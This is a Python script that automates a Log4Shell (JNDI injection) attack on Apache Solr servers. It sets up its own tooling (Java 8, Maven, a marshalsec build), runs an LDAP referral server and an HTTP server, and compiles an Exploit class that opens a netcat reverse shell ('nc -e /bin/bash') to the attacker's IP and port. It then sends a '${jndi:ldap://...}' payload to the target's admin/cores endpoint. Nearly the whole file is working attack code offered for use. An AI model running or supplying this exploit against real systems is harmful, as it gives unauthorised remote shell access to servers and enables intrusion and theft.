# Made by @CaraTortu (06/05/2022)

import os, threading, requests

def detectPkgMngr():
    # Detect package manager and return it
    options = ["apt", "yum", "dnf", "zypper", "pacman"]
    bins = os.listdir("/bin")
    for option in options:
        if option in bins:
            return option

def detectJavaVersion():
    # Detect Java version
    java_version = os.popen("java -version 2>&1").read()
    if "openjdk version" in java_version:
        return java_version

def detectGit():
    git = os.popen("which git 2>&1").read()
    if "which: no" not in git:
        print("[+] Git is installed, checking maven...")
        detectMaven()
    else:
        print("[-] Git is not installed, installing...")
        installGit()

def detectMaven():
    # Detect Maven
    mvn = os.popen("which mvn 2>&1").read()
    if "which: no" not in mvn:
        print("[+] Maven is installed, installing marshall...")
        installMarshall()
    else:
        print("[-] Maven is not installed, installing...")
        installMaven()

def installGit():
    print("[i] If you're not root you will be asked for a password for installation")
    options = {
        "apt": "sudo apt-get install git",
        "yum": "sudo yum install git",
        "dnf": "sudo dnf install git",
        "zypper": "sudo zypper install git",
        "pacman": "sudo pacman -S git"
    }
    os.system(options[detectPkgMngr()])
    print("[+] Git installed, checking maven...")
    detectMaven()

def installMarshall():
    os.system("git clone https://github.com/mbechler/marshalsec.git")
    os.chdir("marshalsec")
    os.system("mvn clean package -DskipTests")
    os.system("cp target/marshalsec*.jar ../")
    os.chdir("..")
    os.system("rm -rf marshalsec *SNAPSHOT.jar")
    os.system("mv * marshalsec.jar")
    print("[+] Marshall installed, running...")
    exploit()

def installMaven():
    print("[i] If you're not root you will be asked for a password for installation")
    options = {
        "apt": "sudo apt-get install maven",
        "yum": "sudo yum install maven",
        "dnf": "sudo dnf install maven",
        "zypper": "sudo zypper install maven",
        "pacman": "sudo pacman -S maven"
    }
    os.system(options[detectPkgMngr()])
    print("[+] Maven installed, installing marshall...")
    installMarshall()

def installJava8():
    print("[i] If you're not root you will be asked for a password for installation")
    options = {
        "apt": "sudo apt-get install openjdk-8-jdk",
        "yum": "sudo yum install java-1.8.0-openjdk",
        "dnf": "sudo dnf install java-1.8.0-openjdk",
        "zypper": "sudo zypper install java-1.8.0-openjdk",
        "pacman": "sudo pacman -S jdk8-openjdk"
    }
    os.system(options[detectPkgMngr()])
    print("[+] Java 8 installed, checking git...")
    detectGit()

def setupJava():
    java_version = detectJavaVersion()

    if java_version:
        if "1.8.0" in java_version:
            print("[+] Java 8 is installed, checking git...")
            detectGit()

    if not java_version:
        print("[-] Java is not installed, installing...")
        installJava8()

def LDAPExploit(ip):
    print("[+] LDAP listener started...")
    os.system(f"java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://{ip}:8000/#Exploit\"")

def httpServer():
    print("[+] HTTP server started...")
    os.system("python3 -m http.server 8000")

def generateExploit(ip, port):
    expl = """
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec(\"nc -e /bin/bash %s %s\");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

    """ % (ip, port)

    with open("Exploit.java", "w") as f:
        f.write(expl)
    
    os.system("javac Exploit.java")
    print("[+] Exploit generated, waiting for threads to finish and execute a shell...")

def triggerExploit(ip, target):
    url = "http://%s:8983/solr/admin/cores?foo=${jndi:ldap://%s:1389/Exploit}" % (target, ip)
    requests.get(url)
    print("[+] Exploit triggered, you should have gotten a reverse shell!")



def setup():
    os.system("mkdir src")
    os.chdir("src")
    setupJava()

def exploit():
    ip = input("Enter the IP address you want to listen on: ")
    port = input("Enter the port for the reverse shell: ")
    target = input("Enter the target IP address: ")

    threading.Thread(target=LDAPExploit, args=(ip,)).start()
    threading.Thread(target=generateExploit, args=(ip, port)).start()
    threading.Thread(target=httpServer).start()
    import time; time.sleep(10)
    threading.Thread(target=triggerExploit, args=(ip, target)).start()


if __name__ == "__main__":
    setup()
